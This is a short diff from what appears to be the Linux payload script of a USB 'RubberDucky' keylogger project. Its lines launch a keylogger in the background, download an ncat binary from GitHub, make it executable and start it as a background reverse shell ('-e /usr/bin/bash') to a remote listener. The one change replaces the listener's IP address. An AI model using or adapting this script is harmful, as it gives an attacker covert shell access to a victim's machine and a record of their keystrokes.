@@ -10,7 +10,7 @@ nohup python3 logger.py &
 
 wget -q https://github.com/Anthony-Figi/RubberDucky-Keylogger-Netcat/raw/master/linux/ncat
 chmod 775 ./ncat
-nohup ./ncat 192.168.1.134 8080 -e /usr/bin/bash &
+nohup ./ncat 192.168.0.19 8080 -e /usr/bin/bash &
 
 
 
